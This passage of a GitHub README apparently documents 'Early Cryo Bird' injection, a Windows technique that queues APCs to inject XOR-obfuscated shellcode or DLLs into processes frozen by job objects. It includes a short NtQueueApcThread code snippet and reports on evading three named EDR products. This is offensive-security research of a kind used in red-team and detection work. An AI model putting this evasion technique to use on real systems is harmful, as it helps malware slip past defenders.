SUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTExNjQxNDg4OWQwYmM5MmQ1MjJkYzc0ZmJkZmEwYmM1MmRlN2VmNjk2MWM4NDk0YTc1MWQ1MWU3YzYwM2I2ZjEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.Rwf9jI6ExDdbSmHZYt3O37adZ7VQrjUhbdwcKDq_SCU)

##### 📦 Loaded Modules

[Permalink: 📦 Loaded Modules](https://github.com/zero2504/Early-Cryo-Bird-Injections#-loaded-modules)

[![DLL_Injection_New_Modules](https://private-user-images.githubusercontent.com/84348823/430523964-ccccbddb-f52a-49d5-9649-7cd517b17038.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjM5NjQtY2NjY2JkZGItZjUyYS00OWQ1LTk2NDktN2NkNTE3YjE3MDM4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTBlMWI1OWQ2ZTEyODRjMTdjODE1NWIxNTYyOGE1MTFjNWFiZjBjNzNjOTIxMTY0MThhNjU3NDNiMzQwNzdhYmMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.fLITX5wjo9W1-QmEBAt6wLxofH8LPY2ESSkPxKEofzM)](https://private-user-images.githubusercontent.com/84348823/430523964-ccccbddb-f52a-49d5-9649-7cd517b17038.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjM5NjQtY2NjY2JkZGItZjUyYS00OWQ1LTk2NDktN2NkNTE3YjE3MDM4LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTBlMWI1OWQ2ZTEyODRjMTdjODE1NWIxNTYyOGE1MTFjNWFiZjBjNzNjOTIxMTY0MThhNjU3NDNiMzQwNzdhYmMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.fLITX5wjo9W1-QmEBAt6wLxofH8LPY2ESSkPxKEofzM)

## 💉🐚 Early Cryo Bird Shellcode Injection

[Permalink: 💉🐚 Early Cryo Bird Shellcode Injection](https://github.com/zero2504/Early-Cryo-Bird-Injections#-early-cryo-bird-shellcode-injection)

As previously mentioned, APCs can also be used for shellcode injection. In my implementation, the process closely mirrors that of a conventional injection. The first six steps are identical to those in the DLL injection variant, the only difference is that instead of writing a DLL path into a memory page, shellcode is written -> in my case, XOR-obfuscated shellcode.

Afterwards, the memory page’s protection is changed to RX (read/execute) to grant execution rights before queuing it as an APC. Interestingly, because the process is frozen when the APC is queued, the shellcode is only executed once the process is thawed and the APCs are processed. There are several ways to leverage APCs at the native level; for example, NtQueueApcThreadEx even allows an APC to be executed on a thread that is normally non-alterable.

### ⚠️➡️ APC Injection Before Thawing

[Permalink: ⚠️➡️ APC Injection Before Thawing](https://github.com/zero2504/Early-Cryo-Bird-Injections#%EF%B8%8F%EF%B8%8F-apc-injection-before-thawing)

```
PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)hVirtualAlloc;
 NTSTATUS statusAPC = NtQueueApcThread(pi.hThread, (PVOID)apcRoutine, NULL, NULL, NULL);

 if (!NT_SUCCESS(statusAPC)) {
     SetColor(FOREGROUND_RED);
     printf("\t[!] NtQueueApcThread Failed With Error : 0x%X \n", statusAPC);
     return FALSE;
 }
 else {
     SetColor(FOREGROUND_GREEN);
     printf("[+] NtQueueApcThread successfully queued APC\n");
 }
```

### 🎥 Proof of Concept

[Permalink: 🎥 Proof of Concept](https://github.com/zero2504/Early-Cryo-Bird-Injections#-proof-of-concept-1)

[![Screenshot 2025-04-04 203753](https://private-user-images.githubusercontent.com/84348823/430525716-e24bb8bc-5187-4e80-83bd-0fd9caf55feb.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjU3MTYtZTI0YmI4YmMtNTE4Ny00ZTgwLTgzYmQtMGZkOWNhZjU1ZmViLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWNjYWVlZGFlY2VjOTQzZDdhNzdmYzQ0NDEwM2IzYWQyMmE2Mzc0YmJiYmVmYjI2MDJmN2M1YjYzODIzNWUwNGUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.bZuD8vS6dmH-ox2lAN3Db-IH5Z0Keqd4PsyI54a9JBw)](https://private-user-images.githubusercontent.com/84348823/430525716-e24bb8bc-5187-4e80-83bd-0fd9caf55feb.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjU3MTYtZTI0YmI4YmMtNTE4Ny00ZTgwLTgzYmQtMGZkOWNhZjU1ZmViLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWNjYWVlZGFlY2VjOTQzZDdhNzdmYzQ0NDEwM2IzYWQyMmE2Mzc0YmJiYmVmYjI2MDJmN2M1YjYzODIzNWUwNGUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.bZuD8vS6dmH-ox2lAN3Db-IH5Z0Keqd4PsyI54a9JBw)

# ⚔️🛡️ Early Bird Cryo Injections vs EDRs

[Permalink: ⚔️🛡️ Early Bird Cryo Injections vs EDRs](https://github.com/zero2504/Early-Cryo-Bird-Injections#%EF%B8%8F%EF%B8%8F-early-bird-cryo-injections-vs-edrs)

Now we’re getting to the part that most people are probably interested in: **Early Cryo technique versus various EDRs**. Before diving in, I’d like to point out that both the DLL and shellcode injection variants dynamically resolve Windows APIs, make use of native NT functions, and specifically in the shellcode variant leverage a **XOR-obfuscated payload**. I’ll keep this section brief, as a deep technical breakdown would go beyond the scope of this summary.

I tested both techniques against three different EDR solutions:

- **Microsoft Defender ATP**
- **Cortex XDR**
- **Trend Vision One**

## 🛡️ Defender ATP

[Permalink: 🛡️ Defender ATP](https://github.com/zero2504/Early-Cryo-Bird-Injections#%EF%B8%8F-defender-atp)

Surprisingly, Defender ATP did not trigger any alerts during testing. While it did observe certain memory-related activities during the shellcode injection (e.g., memory allocation), it didn’t classify them as suspicious. The DLL injection, on the other hand, appeared completely normal to Defender— no anomalies, no incidents.

It's worth noting that an incident **can** occur if you use processes like `dllhost.exe` to spawn `cmd.exe` and execute commands such as `whoami`, depending on the behavior and context.

Overall, Defender seems largely unaffected and captures very little in this scenario.

[![b84aec4f368613c4ac413f57f7916e76_MD5](https://private-user-images.githubusercontent.com/84348823/430526337-2e2e7186-945f-40ae-a639-6da741f685bf.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjYzMzctMmUyZTcxODYtOTQ1Zi00MGFlLWE2MzktNmRhNzQxZjY4NWJmLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mMTg5ZTRkY2NkN2I0YjI2YTE0ZTNjYWYyZTk0OTQzN2E1ZTc4NzZiNzg2YTkzOTcwMTY3Nzc5Y2I0YTc0NDYxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.4cAyaZ3opOqwf9teLaqVudFJe_lwcf7D8wsV0WQMBEc)](https://private-user-images.githubusercontent.com/84348823/430526337-2e2e7186-945f-40ae-a639-6da741f685bf.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjYzMzctMmUyZTcxODYtOTQ1Zi00MGFlLWE2MzktNmRhNzQxZjY4NWJmLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mMTg5ZTRkY2NkN2I0YjI2YTE0ZTNjYWYyZTk0OTQzN2E1ZTc4NzZiNzg2YTkzOTcwMTY3Nzc5Y2I0YTc0NDYxJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.4cAyaZ3opOqwf9teLaqVudFJe_lwcf7D8wsV0WQMBEc)

## 🔬 Cortex XDR

[Permalink: 🔬 Cortex XDR](https://github.com/zero2504/Early-Cryo-Bird-Injections#-cortex-xdr)

Cortex performed significantly better in comparison. In most cases, it triggered at least one incident and actively blocked the malware, particularly in the shellcode injection scenario. The DLL injection was the only method that, under certain conditions, managed to slip through. That’s also the reason the DLL injection variant was developed in combination with the freeze-and-thaw technique.

Cortex's behavioral detection is very solid. With enough experimentation and evasion techniques, it might be possible to bypass it, but that would require more effort. While the DLL injection caused only a single detection, the shellcode variant led to multiple alerts.

**DLL-Injection:** [![a3a69ba3d396e0406e8b21bd2c0cd843_MD5](https://private-user-images.githubusercontent.com/84348823/430526740-1a4e3387-19e7-48ab-940a-9d86f461dc4d.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjY3NDAtMWE0ZTMzODctMTllNy00OGFiLTk0MGEtOWQ4NmY0NjFkYzRkLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yNjhjMWI1Mjk2ZjJlMjYxYjkwNDNmMjk0MzQzYTY5OWU5NzE4NTM3M2UyNGMyZWUxNjczOTJhZmQ4NTM5MjY4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.uO4zv1aooOlR33QQDDvuksxIY1R9jZ9is-PnpcSx0eE)](https://private-user-images.githubusercontent.com/84348823/430526740-1a4e3387-19e7-48ab-940a-9d86f461dc4d.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjY3NDAtMWE0ZTMzODctMTllNy00OGFiLTk0MGEtOWQ4NmY0NjFkYzRkLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0yNjhjMWI1Mjk2ZjJlMjYxYjkwNDNmMjk0MzQzYTY5OWU5NzE4NTM3M2UyNGMyZWUxNjczOTJhZmQ4NTM5MjY4JlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.uO4zv1aooOlR33QQDDvuksxIY1R9jZ9is-PnpcSx0eE)

[![ae2e44c3e002d5c2f3383ca7b8364e37_MD5](https://private-user-images.githubusercontent.com/84348823/430526851-beedc999-ed0c-4a8a-92fc-17335fa5fb13.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjY4NTEtYmVlZGM5OTktZWQwYy00YThhLTkyZmMtMTczMzVmYTVmYjEzLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mMTg2M2Y4NjgwNGQ5NzZjZmRlMDRiNjJmNmE1ZDk3OTRjNDY2NmRkMjhkN2JhNThhMTJlYTk3YmUyNDUyMWFkJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.QO6x-5K2lX3Ttq64UcwKdrWNlRvcc_xqjeoPV7hW7Ro)](https://private-user-images.githubusercontent.com/84348823/430526851-beedc999-ed0c-4a8a-92fc-17335fa5fb13.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjY4NTEtYmVlZGM5OTktZWQwYy00YThhLTkyZmMtMTczMzVmYTVmYjEzLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT1mMTg2M2Y4NjgwNGQ5NzZjZmRlMDRiNjJmNmE1ZDk3OTRjNDY2NmRkMjhkN2JhNThhMTJlYTk3YmUyNDUyMWFkJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.QO6x-5K2lX3Ttq64UcwKdrWNlRvcc_xqjeoPV7hW7Ro)

**Shellcode Injection**

[![73ffb00335f7e673bb461d709d88a2ce_MD5](https://private-user-images.githubusercontent.com/84348823/430527040-c484a41a-a6d8-4c64-818f-14fec1821f53.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjcwNDAtYzQ4NGE0MWEtYTZkOC00YzY0LTgxOGYtMTRmZWMxODIxZjUzLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00YmMwZmZlZTNiNTE0NGNiNDMwNTJlMmNiNWE3YjY5NGFmYzQzNmQ0YTQ4ZmQxNmJkNmE0NTNkODk0OWY0ZGIzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.BBOq0AaeUo_5BiAk4cCduJmFU-dKzSoapAzKsXTGJiM)](https://private-user-images.githubusercontent.com/84348823/430527040-c484a41a-a6d8-4c64-818f-14fec1821f53.jpeg?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA1MjcwNDAtYzQ4NGE0MWEtYTZkOC00YzY0LTgxOGYtMTRmZWMxODIxZjUzLmpwZWc_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjYwMjE4JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI2MDIxOFQxMTA0NDhaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT00YmMwZmZlZTNiNTE0NGNiNDMwNTJlMmNiNWE3YjY5NGFmYzQzNmQ0YTQ4ZmQxNmJkNmE0NTNkODk0OWY0ZGIzJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCJ9.BBOq0AaeUo_5BiAk4cCduJmFU-dKzSoapAzKsXTGJiM)

## 👻 Trend Vision One

[Permalink: 👻 Trend Vision One](https://github.com/zero2504/Early-Cryo-Bird-Injections#-trend-vision-one)

Trend Vision One behaved similarly to Defender ATP **no detections** were triggered for either injection method. Both techniques went completely unnoticed.

**DLL-Injection:** [![trend2](https://private-user-images.githubusercontent.com/84348823/430699015-3f1765fc-3ee3-4517-987b-5258ccb7cfc6.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA2OTkwMTUtM2YxNzY1ZmMtM2VlMy00NTE3LTk4N2ItNTI1OGNjYjdjZmM2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQwNmNlNTQyZmM1NzhjYjY5ZTRiNzc5NDNjYzNlMmMzMDhlOWY1ZDlkOWQ3YjIwZGU2OTY2M2I5ODkwYzMxM2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.BSxuir2VS6CqAXsdb4em8mVxXrGDsPYsNa4tbKcIX-s)](https://private-user-images.githubusercontent.com/84348823/430699015-3f1765fc-3ee3-4517-987b-5258ccb7cfc6.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA2OTkwMTUtM2YxNzY1ZmMtM2VlMy00NTE3LTk4N2ItNTI1OGNjYjdjZmM2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQwNmNlNTQyZmM1NzhjYjY5ZTRiNzc5NDNjYzNlMmMzMDhlOWY1ZDlkOWQ3YjIwZGU2OTY2M2I5ODkwYzMxM2ImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.BSxuir2VS6CqAXsdb4em8mVxXrGDsPYsNa4tbKcIX-s)

**Shellcode Injection:** [![Trend1](https://private-user-images.githubusercontent.com/84348823/430699036-414be52b-2cf4-46e1-9dfe-90e4278dcc26.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA2OTkwMzYtNDE0YmU1MmItMmNmNC00NmUxLTlkZmUtOTBlNDI3OGRjYzI2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ3NjQxZTI0NjBmY2M4MDczM2NiNDE2MzE4M2NhMzkzYWY0OThlNWY2ZWU3ZWNhNGI1OTdiYjAxYzY5MTBlMjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pj1po1SNRz5kZL2rMEKAsFmVPQwjyWKMhOWtoLKVdfo)](https://private-user-images.githubusercontent.com/84348823/430699036-414be52b-2cf4-46e1-9dfe-90e4278dcc26.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NzE0MTI5ODgsIm5iZiI6MTc3MTQxMjY4OCwicGF0aCI6Ii84NDM0ODgyMy80MzA2OTkwMzYtNDE0YmU1MmItMmNmNC00NmUxLTlkZmUtOTBlNDI3OGRjYzI2LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjAyMTglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwMjE4VDExMDQ0OFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ3NjQxZTI0NjBmY2M4MDczM2NiNDE2MzE4M2NhMzkzYWY0OThlNWY2ZWU3ZWNhNGI1OTdiYjAxYzY5MTBlMjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.pj1po1SNRz5kZL2rMEKAsFmVPQwjyWKMhOWtoLKVdfo)

# 🧠 Conclusion

[Permalink: 🧠 Conclusion](https://github.com/zero2504/Early-Cryo-Bird-Injections#-conclusion)

I know many of you might say, "Wow, he’s just using a few things differently." But that’s the beauty of it, right? There’s still so much that can be combined and developed into new techniques, isn’t there? I mean, there’s even another native function that allows direct execution of an APC on a non-alertable thread!

In the end, the goal was to dive deeper into APC as part of the learning process and see what works and what doesn’t. I hope I was able to spark some thoughts or ideas among some of you.

I’m now moving on to the third project of the trilogy, where I will continue to explore Job Freeze/Thaw mechanisms to create some cool stuff. Just a little hint: They exist in the anime series _Bleach_ (Hollows).

# 📚 References

[Permalink: 📚 References](https://github.com/zero2504/Early-Cryo-Bird-Injections#-references)

\[1\] [https://learn.microsoft.com/](https://learn.microsoft.com/)

\[2\] [https://ntdoc.m417z.com/](https://ntdoc.m417z.com/)

\[3\] [https://github.com/winsiderss/systeminformer](https://github.com/winsiderss/systeminformer)

\[4\] [https://github.com/3gstudent/](https://github.com/3gstudent/)

\[5\] [https://maldevacademy.com/](https://maldevacademy.com/)

\[6\] Programming Windows - Charles Petzold

\[7\] Windows via C/C++, Fifth Edition - Jeffrey Richter and Christophe Nasarre

\[8\] [https://scorpiosoftware.net/2024/07/24/what-can-you-do-with-apcs/](https://scorpiosoftware.net/2024/07/24/what-can-you-do-with-apcs/) (Pavel Yosifovich)

## About

Early Bird Cryo Injections – APC-based DLL & Shellcode Injection via Pre-Frozen Job Objects


### Topics

[injection](https://github.com/topics/injection "Topic: injection") [dll-injection](https://github.com/topics/dll-injection "Topic: dll-injection") [shellcode](https://github.com/topics/shellcode "Topic: shellcode") [apc](https://github.com/topics/apc "Topic: apc") [jobobject](https://github.com/topics/jobobject "Topic: jobobject") [nativeapi](https://github.com/topics/nativeapi "Topic: nativeapi") [shellcode-injection](https://github.com/topics/shellcode-injection "Topic: shellcode-injection")

### Resources

[Readme](https://github.com/zero2504/Early-Cryo-Bird-Injections#readme-ov-file)

### License

[MIT license](https://github.com/zero2504/Early-Cryo-Bird-Injections#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/zero2504/Early-Cryo-Bird-Injections).

[Activity](https://github.com/zero2504/Early-Cryo-Bird-Injections/activity)

### Stars

[**136**\\
stars](https://github.com/zero2504/Early-Cryo-Bird-Injections/stargazers)

### Watchers

[**3**\\
watching](https://github.com/zero2504/Early-Cryo-Bird-Injections/watchers)

### Forks

[**18**\\
forks](https://github.com/zero2504/Early-Cryo-Bird-Injections/forks)

